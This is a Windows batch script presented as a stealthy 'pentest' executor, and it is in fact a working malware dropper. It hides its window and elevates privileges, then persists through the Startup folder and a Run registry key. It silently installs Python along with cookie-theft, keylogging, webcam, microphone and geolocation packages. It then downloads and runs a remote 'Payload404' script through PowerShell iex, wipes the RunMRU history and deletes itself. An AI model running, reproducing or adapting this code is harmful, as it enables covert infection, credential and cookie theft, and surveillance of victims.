@echo off
:: =============================================
:: Advanced Silent Admin-Only Executor (Fully Hidden)
:: Version: 2.3 (Optimized for Stealth)
:: =============================================

:: Check for Windows 10/11
ver | find "10." >nul || ver | find "11." >nul || (
    exit /b 1
)

:: Check for admin rights and elevate if needed (UAC prompt will still appear)
fsutil dirty query %SystemDrive% >nul 2>&1 || (
    PowerShell -WindowStyle Hidden -Command "Start-Process -Verb RunAs -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '/pentest'"
    exit /b
)

:: Hide the console window (if not already hidden)
if "%1"=="/pentest" (
    PowerShell -WindowStyle Hidden -Command "& {Add-Type -TypeDefinition '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int hWnd, int nCmdShow);' -Name 'Win32'; [Win32]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 0)}"
)

setlocal EnableDelayedExpansion
set "NULL=>nul 2>&1"

:: ===== ADD TO STARTUP =====
set "STARTUP_REG=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "SCRIPT_NAME=SilentPentestLoader"
set "TARGET_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"

:: Copy script to startup folder if not already there
if not exist "%TARGET_PATH%" (
    copy "%~f0" "%TARGET_PATH%" %NULL%
    reg add "%STARTUP_REG%" /v "%SCRIPT_NAME%" /t REG_SZ /d "\"%TARGET_PATH%\"" /f %NULL%
)

:: Enable CMD access (remove restriction if exists)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 0 /f %NULL%

:: Install Python if not present (fully silent)
where python %NULL% || (
    bitsadmin /transfer pyDL /download /priority foreground https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe %TEMP%\py_setup.exe %NULL%
    start /wait %TEMP%\py_setup.exe /quiet InstallAllUsers=1 PrependPath=1 AssociateFiles=0 Shortcuts=0 %NULL%
    timeout /t 5 /nobreak %NULL%
    del %TEMP%\py_setup.exe %NULL%
)

:: Refresh PATH for current session
for /f "tokens=2*" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path ^| findstr /i "Path"') do (
    setx PATH "%%b;%ProgramFiles%\Python312\;%ProgramFiles%\Python312\Scripts\" %NULL%
)

:: Install required Python packages (fully silent)
python -m pip install --upgrade pip %NULL%
python -m pip install --quiet --no-warn-script-location --disable-pip-version-check --user pywin32 pypiwin32 pycryptodome browser-cookie3 pillow opencv-python sounddevice numpy scipy pynput geocoder requests >nul

:: Run security assessment (fully hidden)
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (irm 'https://raw.githubusercontent.com/distroyer57/Payload404/refs/heads/main/Backtrack.py?token=GHSAT0AAAAAADK5WSFMU25XLMIC5B474I5M2GCC33A')" %NULL%

:: Cleanup
del /q /f %TEMP%\*_setup.* %NULL%
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f %NULL%

:: Self-cleanup (fully hidden)
(
    ping 127.0.0.1 -n 5 ^>nul
    del /f /q "%~f0"
    del /f /q "%%~f0"
) > "%TEMP%\cleanup.cmd"

start /B cmd /c "%TEMP%\cleanup.cmd"
exit /b
